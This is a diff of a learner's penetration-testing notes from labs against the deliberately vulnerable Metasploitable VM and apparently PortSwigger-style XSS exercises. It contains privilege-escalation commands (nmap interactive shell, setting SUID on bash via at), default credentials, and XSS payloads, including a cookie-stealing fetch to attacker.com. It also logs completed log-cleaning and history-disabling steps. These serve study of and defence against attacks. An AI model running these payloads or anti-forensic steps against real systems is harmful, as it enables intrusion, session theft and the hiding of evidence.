@@ -17,10 +17,20 @@ find / -perm -4000 2>/dev/null
 what i learned: finds files that run as root no matter who runs them
 why it matters: these are my privesc targets in Stage 3
 
+Find SUID binaries owned by root that are world-executable: [DONE]
+find / -perm -4000 -perm -o+x -user root 2>/dev/null
+what i learned: more specific search — filters to root-owned SUID files only
+
 Find writable files: [DONE]
 find / -writable -type f 2>/dev/null
 what i learned: finds files anyone can write to
 why it matters: if a root-owned script is writable i can edit it
+
+Find world-writable files excluding /proc: [DONE]
+find / -perm -002 -type f -user root 2>/dev/null | grep -v /proc
+find / -perm -002 -type d 2>/dev/null | grep -v /proc
+what i learned: /proc is a virtual filesystem — always shows writable, ignore it
+why it matters: real writable files/dirs are actual privesc paths
 
 Find files containing password: [DONE]
 grep -r "password" /etc/ 2>/dev/null
@@ -125,6 +135,32 @@ Full OPSEC routine — do this every session: [DONE]
 9. exit
 
 ======================================================
+STAGE 3 PRIVESC TARGETS — METASPLOITABLE SUID BINARIES
+======================================================
+
+/usr/bin/nmap — EXPLOITABLE
+method: nmap --interactive then !sh = root shell
+reason: nmap runs as root via SUID, interactive mode spawns shell
+use in Stage 3: confirmed privesc path
+
+/usr/bin/sudo — CHECK RULES
+method: sudo -l then look for misconfigured commands
+reason: if any command runs as root without password = escalation path
+use in Stage 3: run sudo -l first on every compromised machine
+
+/usr/lib/pt_chown — LEGACY
+method: old glibc exploit, version dependent
+reason: historically used for terminal device ownership
+use in Stage 3: try if other methods fail
+
+/usr/bin/at — SCHEDULE AS ROOT
+method: echo "chmod +s /bin/bash" | at now
+reason: at runs scheduled jobs as root when SUID
+use in Stage 3: schedule malicious command to run as root
+
+all others: no reliable general exploit path on this version
+
+======================================================
 CREDENTIALS FOUND ON METASPLOITABLE
 ======================================================
 
@@ -145,7 +181,7 @@ username: tomcat  password: tomcat  roles: admin,manager
 username: both    password: tomcat
 
 MySQL direct access: root with no password
-VNC default password: password → gives root GUI desktop
+VNC default password: password — gives root GUI desktop
 
 ======================================================
 WINDOWS
@@ -180,14 +216,6 @@ what i learned: shows all command shortcuts in PowerShell
                cd is an alias for Set-Location
 
 ======================================================
-METASPLOITABLE — SUID BINARIES TO EXPLOIT IN STAGE 3
-======================================================
-
-/usr/bin/nmap      old version can spawn a root shell
-/usr/bin/at        schedules commands — can run as root
-/usr/lib/pt_chown  known privilege escalation vector
-
-======================================================
 NETWORKING
 ======================================================
 
@@ -205,7 +233,7 @@ nmap -sn 192.168.56.0/24
 what i learned: finds live hosts without port scanning
 always run this first to confirm Metasploitable IP before every session
 
-Stealth scan: [TAUGHT — practice in Stage 3]
+Stealth scan: [STAGE 3]
 nmap -sS TARGET_IP
 what i learned: sends SYN but never completes the handshake
                harder to detect than a full TCP connect scan
@@ -236,6 +264,32 @@ what it revealed on Metasploitable:
 - WebDAV enabled — file upload possible
 - web apps: phpMyAdmin, DVWA, Mutillidae, TWiki, WebDAV
 
+Manual FTP with netcat: [DONE]
+nc TARGET_IP 21
+USER anonymous    → 331 password required
+PASS anonymous@   → 230 login successful
+PWD               → 257 current directory
+STOR file.txt     → 425 use PORT or PASV first
+QUIT              → 221 goodbye
+note: LIST and STOR require a data channel — netcat only has control channel
+FTP response codes:
+220 = service ready
+331 = username ok, password required
+230 = login successful
+257 = pathname shown
+425 = cannot open data connection
+550 = file unavailable or permission denied
+553 = cannot create file
+221 = goodbye
+
+SMTP username enumeration: [DONE]
+nc TARGET_IP 25
+VRFY username
+252 = user exists
+550 = user does not exist
+confirmed on Metasploitable: root, msfadmin, user, bin, daemon, sys exist
+admin does not exist
+
 Capture traffic: [DONE]
 wireshark
 
@@ -248,7 +302,6 @@ ip.addr == TARGET_IP && ftp
 Follow TCP Stream in Wireshark: [DONE]
 right click any packet → Follow → TCP Stream
 shows entire conversation as readable text
-use this on any captured session to read the full exchange
 
 File transfer via Python HTTP server: [DONE]
 on Kali:   python3 -m http.server 8080
@@ -259,15 +312,11 @@ nc TARGET_IP 4444 < file.txt
 
 File transfer via netcat receive: [DONE]
 nc -lvp 4444 > file.txt
-what i learned: -l listen, -v verbose, -p port number
 
 Check routing table: [DONE]
 route -n
-what i found on Kali:
-default gateway:  10.0.2.1    via eth1 — internet traffic goes here
+default gateway:  10.0.2.1    via eth1 — internet
 lab network:      192.168.56.0 via eth0 — direct to Metasploitable
-eth0: Host-Only network — lab
-eth1: NAT network — internet
 
 Check ARP table: [DONE]
 arp -a
@@ -278,13 +327,6 @@ no password required — critical misconfiguration
 databases found: dvwa, metasploit, mysql, owasp10, tikiwiki
 dvwa admin hash: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
 
-SMTP username enumeration: [DONE]
-nc TARGET_IP 25
-VRFY username
-252 = user exists
-550 = user does not exist
-confirmed on Metasploitable: root, msfadmin, nobody exist — admin does not
-
 VNC access: [DONE]
 vncviewer 192.168.56.104
 default password: password
@@ -292,7 +334,15 @@ result: root GUI desktop — no exploit needed
 
 Bindshell instant root: [DONE]
 nc 192.168.56.104 1524
-result: root@metasploitable:/# — instant root shell, no credentials needed
+result: root@metasploitable:/# — instant root shell
+
+rexec service: [DONE]
+nc TARGET_IP 512
+banner: Where are you?
+what it does: remote command execution with cleartext credentials
+why dangerous: no encryption — credentials captured by Wireshark
+               executes commands on remote machine
+use in Stage 3: exploit with Metasploit auxiliary module
 
 ======================================================
 SSH
@@ -341,16 +391,18 @@ Config file: /etc/proxychains4.conf
 MY PYTHON TOOLS — BUILT FROM SCRATCH
 ======================================================
 
-Single port checker:    python3 ~/red-team-tools/python-tools/single_port_checker.py
-Port scanner:           python3 ~/red-team-tools/python-tools/port_scanner.py
-Banner grabber:         python3 ~/red-team-tools/python-tools/banner_grabber.py
-Full recon tool:        python3 ~/red-team-tools/python-tools/recon.py
-Advanced recon tool:    python3 ~/red-team-tools/python-tools/recon_advanced.py
-Scanner with args:      python3 ~/red-team-tools/python-tools/scanner.py TARGET_IP
-Multi-service checker:  python3 ~/red-team-tools/python-tools/multi-service-checker.py
-Anonymous FTP checker:  python3 ~/red-team-tools/python-tools/check_anonymous_ftp.py
-Port+targets scanner:   python3 ~/red-team-tools/python-tools/port_and_targets/main.py
-Timestamped scanner:    python3 ~/red-team-tools/python-tools/port_scanner/scanner.py TARGET_IP
+Single port checker:       python3 ~/red-team-tools/python-tools/single_port_checker.py
+Port scanner:              python3 ~/red-team-tools/python-tools/port_scanner.py
+Banner grabber:            python3 ~/red-team-tools/python-tools/banner_grabber.py
+Full recon tool:           python3 ~/red-team-tools/python-tools/recon.py
+Advanced recon tool:       python3 ~/red-team-tools/python-tools/recon_advanced.py
+Scanner with args:         python3 ~/red-team-tools/python-tools/scanner.py TARGET_IP
+Multi-service checker:     python3 ~/red-team-tools/python-tools/multi-service-checker.py
+Anonymous FTP checker:     python3 ~/red-team-tools/python-tools/check_anonymous_ftp.py
+Port and targets scanner:  python3 ~/red-team-tools/python-tools/port_and_targets/main.py
+Timestamped scanner:       python3 ~/red-team-tools/python-tools/port_scanner/scanner.py TARGET_IP
+Vulnerability report:      python3 ~/red-team-tools/python-tools/vulnerability_report.py
+Service markdown report:   python3 ~/red-team-tools/python-tools/service_report.py
 
 ======================================================
 MY LAB
@@ -365,6 +417,7 @@ vsftpd 2.3.4   port 21   backdoor — instant root shell
 Samba 3.0.20   port 139  usermap_script — instant root shell
 UnrealIRCd     port 6667 backdoor — instant root shell
 Bindshell      port 1524 already open — netcat = instant root
+nmap SUID             — nmap --interactive then !sh = root shell
 
 ======================================================
 SERVICES I FOUND ON METASPLOITABLE
@@ -379,7 +432,7 @@ Port 80   HTTP        Apache 2.2.8        HIGH
 Port 111  RPC                             LOW
 Port 139  SMB         Samba 3.0.20        CRITICAL
 Port 445  SMB         Samba 3.0.20        CRITICAL
-Port 512  rexec       Where are you?      HIGH
+Port 512  rexec       cleartext RCE       HIGH
 Port 513  rlogin                          HIGH
 Port 514  rsh                             HIGH
 Port 1099 Java RMI                        MEDIUM
@@ -418,15 +471,12 @@ SQL strings are wrapped in single quotes
 injecting ' breaks out of the string and lets you write your own SQL
 
 Types of SQLi:
-
 IN-BAND — attack and result use same channel
   Error-based  — force DB errors to reveal version and structure info
   Union-based  — combine queries with UNION to pull extra data from DB
-
 INFERENTIAL (BLIND) — no data transferred directly
   Boolean-based — send true/false conditions, observe page differences
   Time-based    — send sleep command, observe response delay
-
 OUT-OF-BAND — DB sends data to attacker external server via DNS/HTTP
 
 Key SQL vocabulary:
@@ -577,72 +627,62 @@ cookie steal:   <script>fetch('https://attacker.com?c='+document.cookie)</script
 Lab goal: make alert(document.domain) execute in the browser
 
 HTML contexts and matching payloads:
-between tags:     <p>INPUT</p>          → <script>alert(1)</script> or <img src=x onerror=alert(1)>
+between tags:     <p>INPUT</p>          → <script>alert(1)</script>
 inside attribute: <input value="INPUT"> → "><script>alert(1)</script>
 inside JS string: var x='INPUT'         → ';alert(1)//
 inside href:      <a href="INPUT">      → javascript:alert(document.cookie)
-innerHTML sink:   JS writes INPUT to DOM → script tags BLOCKED → use <img src=x onerror=alert(1)>
+innerHTML sink:   JS writes INPUT to DOM → script tags BLOCKED
+                                         → use <img src=x onerror=alert(1)>
 
-Key concept — innerHTML blocks script tags:
-browsers block <script> injected via innerHTML
-always use event handlers instead: onerror, onload, onfocus, onmouseover
-
-Key concept — event handlers fire on specific triggers:
-onerror   — fires when a resource fails to load (img, script)
-onload    — fires when a resource loads successfully (img, body, iframe)
-onfocus   — fires when element receives focus (input, textarea)
+Key concepts:
+innerHTML blocks script tags — use event handlers instead
+onerror   — fires when resource fails to load (img, script)
+onload    — fires when resource loads successfully
+onfocus   — fires when element receives focus
 onmouseover — fires when mouse moves over element
 onhashchange — fires when URL # fragment changes
+autofocus — forces element to receive focus on page load
+           combine with onfocus for automatic execution without user interaction
 
-Key concept — jQuery $() behavior in old versions:
-input starting with < is treated as HTML and creates DOM elements
-input not starting with < is treated as a CSS selector
-attacker uses this by passing HTML payload starting with 
-jQuery creates the element, event fires, JavaScript executes
+jQuery $() in old versions:
+input starting with < treated as HTML — creates DOM elements
+input not starting with < treated as CSS selector
+attacker passes HTML payload starting with < to create elements
 
-Key concept — location.hash:
-the # part of the URL — browser never sends it to the server
-attacker controls it by crafting a malicious URL
+location.hash:
+the # part of URL — browser never sends to server
+attacker controls by crafting malicious URL
 hashchange event fires when it changes
-used in DOM XSS when page reads window.location.hash
 
 XSS testing methodology:
-1. find every input point — search boxes, URL params, form fields, URL hash
+1. find every input point
 2. submit unique test string: xsstest123
 3. view page source Ctrl+U — search for xsstest123
 4. identify HTML context surrounding your string
-5. identify which parser interprets the input — HTML parser, JS engine, jQuery
-6. determine if breakout is required
-7. pick payload matching that context
+5. identify which parser interprets input — HTML, JS engine, jQuery, framework
+6. determine if breakout required
+7. pick payload matching context
 8. if blocked — try alternative tags/events, try URL encoding
 9. confirm: alert(document.domain) fires = XSS confirmed
 
 XSS structured analysis for every lab:
-vulnerability type:
-source:
-sink:
-execution context:
-which parser interprets input:
-need breakout:
-reasoning to payload:
-why vulnerability exists:
-how to prevent:
-attacker impact:
+vulnerability type / source / sink / execution context /
+which parser / need breakout / reasoning / why it exists /
+how to prevent / attacker impact
 
 Real bug bounty universal probe:
 "><img src=x onerror=alert(1)>
-covers attribute context AND event handler execution
 
 XSS prevention:
-output encoding:  convert < to &lt; and > to &gt; before rendering
-CSP header:       restrict which scripts browser will execute
-input validation: reject dangerous characters at input
+output encoding — convert < to &lt; and > to &gt;
+CSP header — restrict which scripts browser executes
+input validation — reject dangerous characters at input
 
 XSS delivery methods:
-reflected:  craft malicious URL and send to victim
-stored:     submit payload into stored field, fires for every visitor
-DOM:        craft malicious URL with payload in parameter or hash
-exploit server: host iframe page, deliver to victim via lab exploit server
+reflected:      craft malicious URL, send to victim
+stored:         submit payload into stored field
+DOM:            craft malicious URL with payload in parameter or hash
+exploit server: host iframe page, deliver to victim
 
 ======================================================
 XSS LABS
@@ -657,6 +697,7 @@ breakout: no
 payload: <script>alert(1)</script>
 why it exists: user input reflected into HTML without encoding
 fix: HTML encode output before rendering
+attacker impact: steal session cookies, redirect victim, execute actions as victim
 
 Lab 02 XSS — Stored XSS in HTML context — DONE
 type: stored
@@ -666,54 +707,57 @@ context: HTML text — data state
 breakout: no
 payload: <script>alert(1)</script>
 why it exists: stored user input rendered into HTML without encoding
-fix: HTML encode output before rendering, validate input on submission
+fix: HTML encode output before rendering, validate on submission
+attacker impact: mass account takeover — fires for every visitor
 
 Lab 03 XSS — DOM XSS via document.write — DONE
 type: DOM
 source: window.location.search
 sink: document.write()
-context: double-quoted attribute value — attribute value state
+context: double-quoted attribute value state
 breakout: yes — close attribute with "
 payload: "><svg onload=alert(1)>
 why it exists: document.write() used with unsanitized user input
-fix: avoid document.write() — use safe DOM APIs like textContent
+fix: avoid document.write() — use textContent
+attacker impact: executes in victim browser on page load
 
 Lab 04 XSS — DOM XSS via innerHTML — DONE
 type: DOM
 source: window.location.search
 sink: element.innerHTML
 context: HTML text after innerHTML assignment
-breakout: no — already in HTML context
+breakout: no
 script tags: BLOCKED by browser in innerHTML
 payload: <img src=0 onerror="alert(1)">
 why it exists: innerHTML used with unsanitized user input
-fix: use textContent instead of innerHTML — sanitize if HTML required
+fix: use textContent instead of innerHTML
+attacker impact: executes when victim loads crafted URL
 
 Lab 05 XSS — DOM XSS in jQuery href attribute — DONE
 type: DOM
 source: window.location.search returnPath parameter
 sink: jQuery .attr('href')
-context: URL context — full href value controlled by attacker
+context: URL context — full href value controlled
 breakout: no — attacker controls entire href value
 payload: javascript:alert(document.cookie)
-why it works: browser executes javascript: scheme when link is clicked
-why it exists: untrusted input assigned directly to href without URL validation
+why it exists: untrusted input assigned to href without URL validation
 fix: validate URL scheme — only allow http: https: and relative URLs
+attacker impact: steals cookies when victim clicks the back link
 
 Lab 06 XSS — DOM XSS via jQuery hashchange — DONE
 type: DOM
 source: window.location.hash
-sink: jQuery $() selector
-context: jQuery selector — old jQuery treats HTML as DOM creation
-breakout: yes — need to escape selector context with HTML starting with 
-interpreter: jQuery 1.8.2 selector engine — not the browser HTML parser
+sink: jQuery $() selector — jQuery 1.8.2
+context: jQuery selector context
+interpreter: jQuery 1.8.2 selector engine
+breakout: yes — escape selector with HTML starting with 
 payload in hash: <img src=x onerror=print()>
-delivery: iframe with onload that appends hash after page loads
+delivery: iframe with onload appending hash after page loads
 final exploit: <iframe src="LAB-URL" onload="this.src+='#<img src=x onerror=print()>'"></iframe>
-why onload needed: hashchange only fires when hash changes — not on initial load
-why it exists: outdated jQuery treats HTML strings as DOM elements
-               untrusted location.hash passed directly to $()
-fix: upgrade jQuery — never pass untrusted input to $() selector
+why onload needed: hashchange only fires when hash changes, not on initial load
+why it exists: outdated jQuery, untrusted location.hash passed to $()
+fix: upgrade jQuery, never pass untrusted input to $()
+attacker impact: fires in victim browser when they visit exploit page
 
 Lab 07 XSS — Reflected XSS into HTML attribute — DONE
 type: reflected
@@ -722,38 +766,42 @@ sink: value attribute of input element
 context: double-quoted HTML attribute value state
 encoding: angle brackets encoded, quotes NOT encoded
 breakout: yes — use " to close attribute value
-key insight: onclick requires interaction — use autofocus+onfocus for automatic execution
+key insight: onclick requires interaction
+             autofocus + onfocus = automatic execution without user click
 payload: " autofocus onfocus="alert(1)
-why it exists: quotes not encoded so attribute breakout possible
+why it exists: quotes not encoded allows attribute breakout
 fix: encode all special characters including quotes in attribute context
+attacker impact: executes automatically when victim loads crafted URL
 
 Lab 08 XSS — Stored XSS in href attribute — DONE
 type: stored
 source: website field in comment form
-sink: href attribute of author link element
-context: URL context — entire href value controlled
-encoding: double quotes encoded — irrelevant since no breakout needed
-breakout: no — attacker controls entire href value
+sink: href attribute of author link
+context: URL context — entire href controlled
+encoding: double quotes encoded — irrelevant, no breakout needed
+breakout: no
 payload: javascript:alert(1)
-why it exists: dangerous URL schemes not validated or blocked
-fix: allowlist only safe schemes — https: http: and relative URLs
+why it exists: dangerous URL schemes not validated
+fix: allowlist only https: http: and relative URLs
+attacker impact: executes when any visitor clicks the author link
 
 Lab 09 XSS — Reflected XSS into JavaScript string — DONE
 type: reflected
 source: search parameter
 sink: JavaScript string variable assignment — var searchTerms = 'USER_INPUT'
 context: JavaScript string context — single-quoted
-encoding: angle brackets HTML-encoded — irrelevant in JS context
-interpreter: JavaScript parser — not HTML parser
+encoding: angle brackets encoded — irrelevant in JS context
+interpreter: JavaScript parser
 breakout: yes — use ' to close the string
 payload: ';alert(1);//
 reasoning:
   ' closes the JavaScript string
   ; terminates the current statement
-  alert(1); injects new JavaScript statement
-  // comments out remainder to prevent syntax errors
+  alert(1); injects new JavaScript
+  // comments out remainder
 why it exists: user input concatenated into JavaScript string without JS escaping
-fix: JSON-encode user data when embedding in JavaScript — never concatenate raw input
+fix: JSON-encode user data when embedding in JavaScript
+attacker impact: executes in victim browser on page load
 
 Lab 10 XSS — DOM XSS inside select element — DONE
 type: DOM
@@ -762,31 +810,31 @@ sink: document.write() inside option element
 context: HTML text inside option element
 breakout: yes — close option and select elements first
 payload: </option></select><img src=x onerror=alert(1)>
-reasoning: HTML inside option is treated as content
-           must escape both option and select before injecting executable HTML
+reasoning: HTML inside option treated as content
+           must escape both option and select before injecting
 why it exists: document.write() used with unsanitized user input
 fix: use createElement and textContent instead of document.write()
+attacker impact: executes in victim browser on page load
 
 Lab 11 XSS — DOM XSS via AngularJS expression — DONE
 type: DOM
 source: search parameter
 sink: AngularJS expression evaluator
 context: AngularJS expression context — inside ng-app scope
-interpreter: AngularJS expression parser — not HTML or JS parser
-encoding: angle brackets and quotes encoded — irrelevant in this context
+interpreter: AngularJS expression parser
+encoding: angle brackets and quotes encoded — irrelevant
 breakout: no — already inside expression context
-detection: inject {{7*7}} — if page shows 49 = AngularJS is evaluating expressions
+detection: inject {{7*7}} — if page shows 49 = AngularJS evaluating expressions
 payload: {{$on.constructor('alert(1)')()}}
 note: looked at solution — AngularJS sandbox escape requires framework knowledge
 why it exists: untrusted input evaluated as AngularJS expression
 fix: never evaluate user input as framework expressions
-               render user data as plain text only
+attacker impact: executes arbitrary JavaScript in victim browser
 
-key concept — template injection vs XSS:
-when a framework evaluates user input as expressions
-the interpreter is the framework parser not the browser HTML parser
-{{}} is the AngularJS expression delimiter
-$on.constructor accesses the Function constructor to execute arbitrary JS
+key concept — template injection:
+when framework evaluates user input as expressions
+{{}} is AngularJS expression delimiter
+$on.constructor accesses Function constructor to execute arbitrary JS
 this is a sandbox escape technique specific to AngularJS
 
 ======================================================
@@ -794,7 +842,7 @@ THINGS I STILL NEED TO PRACTICE
 ======================================================
 
 [ ] ssh-keygen and ssh-copy-id — generate and deploy key pair
-[ ] practice stealth scan — Stage 3
+[ ] stealth scan practice — Stage 3
 [ ] port forwarding — Stage 4
 
 [x] disable history — DONE
@@ -802,24 +850,27 @@ THINGS I STILL NEED TO PRACTICE
 [x] surgical log clean by IP and username — DONE
 [x] full OPSEC routine from memory — DONE
 [x] find private keys on Metasploitable — DONE
+[x] find SUID binaries and research privesc paths — DONE
+[x] find world-writable files excluding /proc — DONE
 [x] run route -n and understand routing table — DONE
 [x] send raw HTTP GET via netcat — DONE
+[x] manual FTP session with netcat — DONE
 [x] transfer file Kali to Metasploitable via Python HTTP server — DONE
 [x] transfer file via netcat both directions — DONE
 [x] run crontab -l and cat /etc/crontab — DONE
 [x] run nmap -sC and read script output — DONE
 [x] run nmap -sV and identify all services — DONE
-[x] find SUID binaries on Metasploitable — DONE
 [x] find PHP config files with credentials — DONE
 [x] connect to bindshell port 1524 — instant root — DONE
 [x] VNC access with default credentials — DONE
 [x] MySQL direct access no password — DONE
 [x] SMTP username enumeration — DONE
+[x] rexec banner grab — DONE
 [x] list users with real shells — DONE
 [x] SSH into Metasploitable — DONE
 [x] read auth.log live while SSHing in — DONE
 [x] grep failed and accepted logins from auth.log — DONE
-[x] built 10+ Python tools from scratch — DONE
+[x] built 12+ Python tools from scratch — DONE
 [x] set up GitHub and pushed all tools — DONE
 [x] SQLi complete — 14 labs done — DONE
-[x] XSS labs 1-6 done with structured methodology — DONE
+[x] XSS labs 1-11 done with structured methodology — DONE
